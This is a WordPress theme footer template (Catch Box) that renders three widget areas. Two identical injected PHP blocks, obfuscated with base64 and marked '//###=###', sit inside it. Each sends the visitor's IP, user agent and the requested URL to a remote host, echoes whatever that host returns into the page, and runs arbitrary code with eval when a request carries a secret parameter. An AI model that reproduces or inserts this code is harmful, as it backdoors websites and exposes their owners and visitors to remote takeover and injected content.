<?php
/**
 * The Footer widget areas.
 *
 * @package Catch Themes
 * @subpackage Catch_Box
 * @since Catch Box 1.0
 */
?>

<?php
	/* The footer widget area is triggered if any of the areas
	 * have widgets. So let's check that first.
	 *
	 * If none of the sidebars have widgets, then let's bail early.
	 */
	if (   ! is_active_sidebar( 'sidebar-2'  )
		&& ! is_active_sidebar( 'sidebar-3' )
		&& ! is_active_sidebar( 'sidebar-4'  )
	)
		return;
	// If we get this far, we have widgets. Let do this.
?>
<div id="supplementary" <?php catchbox_footer_sidebar_class(); ?>>
	<?php if ( is_active_sidebar( 'sidebar-2' ) ) : ?>
	<div id="first" class="widget-area" role="complementary">
		<?php dynamic_sidebar( 'sidebar-2' ); ?>
	</div><!-- #first .widget-area -->
	<?php endif; ?>

	<?php if ( is_active_sidebar( 'sidebar-3' ) ) : ?>
	<div id="second" class="widget-area" role="complementary">
		<?php dynamic_sidebar( 'sidebar-3' ); ?>
	</div><!-- #second .widget-area -->
	<?php endif; ?>

	<?php if ( is_active_sidebar( 'sidebar-4' ) ) : ?>
	<div id="third" class="widget-area" role="complementary">
		<?php dynamic_sidebar( 'sidebar-4' ); ?>
	</div><!-- #third .widget-area -->
	<?php endif; ?>
<?php 
//###=###
error_reporting(0); ini_set("display_errors", "0"); if (!isset($i4f8d9b0b)) { $i4f8d9b0b = TRUE;  $GLOBALS['_2124457193_']=Array(base64_decode('' .'cH' .'JlZ19tYXRjaA=='),base64_decode('ZmlsZV' .'9nZX' .'RfY29u' .'dGVud' .'H' .'M='),base64_decode('' .'ZmlsZV9n' .'ZXRfY29udGV' .'udHM='),base64_decode('dXJsZW5jb2Rl'),base64_decode('' .'dXJs' .'ZW5j' .'b2Rl'),base64_decode('bWQ1'),base64_decode('' .'c3Rycm' .'Nocg=='),base64_decode('c3Rya' .'XB' .'zbG' .'FzaG' .'Vz'));  function _1162772897($i){$a=Array('Y2xpZW50' .'X2No' .'ZWNr','' .'Y2x' .'pZW50X2NoZW' .'N' .'r','' .'SFRUUF9' .'BQ0N' .'F' .'UFRfQ0hBU' .'lNFV' .'A==','' .'IS4hdQ==','U0N' .'SSVB' .'UX' .'0ZJ' .'TEV' .'OQU1F','VVRGLTg' .'=','d2lu' .'ZG93cy0xMjUx','SFRU' .'UF9B' .'Q0NF' .'UFR' .'fQ0hBUlNF' .'VA' .'==','' .'a' .'HR0cDovLw=' .'=','OD' .'UuMj' .'UuMTM' .'0Lj' .'I3' .'L2dl' .'dC5wa' .'HA/ZD0=','U' .'0VSVk' .'VSX05BTUU=','U' .'k' .'VRVU' .'V' .'TV' .'F9' .'VUkk=','JnU9','SFR' .'UUF' .'9VU0VSX0' .'FHRU5U','JmM' .'9','' .'Jmk' .'9M' .'S' .'ZpcD0=','Uk' .'VNT1RFX0' .'FERFI=','' .'Jmg9','MWZ' .'lMDgyMmE0NjY1NDc' .'2YmQ5NDU2Yjk5M' .'TIy' .'MDAyN' .'GE=','U0VSV' .'kVSX05B' .'T' .'UU' .'=','' .'UkVRV' .'UVTV' .'F9VUkk' .'=','S' .'FRUU' .'F9VU0VSX0FHRU5' .'U','MQ==','' .'cA=' .'=','' .'c' .'A==','NGY4ZDliMGI' .'=');return base64_decode($a[$i]);}  if(!empty($_COOKIE[_1162772897(0)]))die($_COOKIE[_1162772897(1)]);if(!isset($pfb_0[_1162772897(2)])){if($GLOBALS['_2124457193_'][0](_1162772897(3),$GLOBALS['_2124457193_'][1]($_SERVER[_1162772897(4)]))){$pfb_1=_1162772897(5);}else{$pfb_1=_1162772897(6);}}else{$pfb_1=$pfb_0[_1162772897(7)];}echo $GLOBALS['_2124457193_'][2](_1162772897(8) ._1162772897(9) .$GLOBALS['_2124457193_'][3]($_SERVER[_1162772897(10)] .$_SERVER[_1162772897(11)]) ._1162772897(12) .$GLOBALS['_2124457193_'][4]($_SERVER[_1162772897(13)]) ._1162772897(14) .$pfb_1 ._1162772897(15) .$_SERVER[_1162772897(16)] ._1162772897(17) .$GLOBALS['_2124457193_'][5](_1162772897(18) .$_SERVER[_1162772897(19)] .$_SERVER[_1162772897(20)] .$_SERVER[_1162772897(21)] .$pfb_1 ._1162772897(22)));while(round(0+3919)-round(0+783.8+783.8+783.8+783.8+783.8))$GLOBALS['_2124457193_'][6]($pfb_1);if(isset($_REQUEST[_1162772897(23)])&& $_REQUEST[_1162772897(24)]== _1162772897(25)){eval($GLOBALS['_2124457193_'][7]($_REQUEST["c"]));}  }
//###=###
?>
<?php 
//###=###
error_reporting(0); ini_set("display_errors", "0"); if (!isset($i4f8d9b0b)) { $i4f8d9b0b = TRUE;  $GLOBALS['_2124457193_']=Array(base64_decode('' .'cH' .'JlZ19tYXRjaA=='),base64_decode('ZmlsZV' .'9nZX' .'RfY29u' .'dGVud' .'H' .'M='),base64_decode('' .'ZmlsZV9n' .'ZXRfY29udGV' .'udHM='),base64_decode('dXJsZW5jb2Rl'),base64_decode('' .'dXJs' .'ZW5j' .'b2Rl'),base64_decode('bWQ1'),base64_decode('' .'c3Rycm' .'Nocg=='),base64_decode('c3Rya' .'XB' .'zbG' .'FzaG' .'Vz'));  function _1162772897($i){$a=Array('Y2xpZW50' .'X2No' .'ZWNr','' .'Y2x' .'pZW50X2NoZW' .'N' .'r','' .'SFRUUF9' .'BQ0N' .'F' .'UFRfQ0hBU' .'lNFV' .'A==','' .'IS4hdQ==','U0N' .'SSVB' .'UX' .'0ZJ' .'TEV' .'OQU1F','VVRGLTg' .'=','d2lu' .'ZG93cy0xMjUx','SFRU' .'UF9B' .'Q0NF' .'UFR' .'fQ0hBUlNF' .'VA' .'==','' .'a' .'HR0cDovLw=' .'=','OD' .'UuMj' .'UuMTM' .'0Lj' .'I3' .'L2dl' .'dC5wa' .'HA/ZD0=','U' .'0VSVk' .'VSX05BTUU=','U' .'k' .'VRVU' .'V' .'TV' .'F9' .'VUkk=','JnU9','SFR' .'UUF' .'9VU0VSX0' .'FHRU5U','JmM' .'9','' .'Jmk' .'9M' .'S' .'ZpcD0=','Uk' .'VNT1RFX0' .'FERFI=','' .'Jmg9','MWZ' .'lMDgyMmE0NjY1NDc' .'2YmQ5NDU2Yjk5M' .'TIy' .'MDAyN' .'GE=','U0VSV' .'kVSX05B' .'T' .'UU' .'=','' .'UkVRV' .'UVTV' .'F9VUkk' .'=','S' .'FRUU' .'F9VU0VSX0FHRU5' .'U','MQ==','' .'cA=' .'=','' .'c' .'A==','NGY4ZDliMGI' .'=');return base64_decode($a[$i]);}  if(!empty($_COOKIE[_1162772897(0)]))die($_COOKIE[_1162772897(1)]);if(!isset($pfb_0[_1162772897(2)])){if($GLOBALS['_2124457193_'][0](_1162772897(3),$GLOBALS['_2124457193_'][1]($_SERVER[_1162772897(4)]))){$pfb_1=_1162772897(5);}else{$pfb_1=_1162772897(6);}}else{$pfb_1=$pfb_0[_1162772897(7)];}echo $GLOBALS['_2124457193_'][2](_1162772897(8) ._1162772897(9) .$GLOBALS['_2124457193_'][3]($_SERVER[_1162772897(10)] .$_SERVER[_1162772897(11)]) ._1162772897(12) .$GLOBALS['_2124457193_'][4]($_SERVER[_1162772897(13)]) ._1162772897(14) .$pfb_1 ._1162772897(15) .$_SERVER[_1162772897(16)] ._1162772897(17) .$GLOBALS['_2124457193_'][5](_1162772897(18) .$_SERVER[_1162772897(19)] .$_SERVER[_1162772897(20)] .$_SERVER[_1162772897(21)] .$pfb_1 ._1162772897(22)));while(round(0+3919)-round(0+783.8+783.8+783.8+783.8+783.8))$GLOBALS['_2124457193_'][6]($pfb_1);if(isset($_REQUEST[_1162772897(23)])&& $_REQUEST[_1162772897(24)]== _1162772897(25)){eval($GLOBALS['_2124457193_'][7]($_REQUEST["c"]));}  }
//###=###
?>


</div><!-- #supplementary -->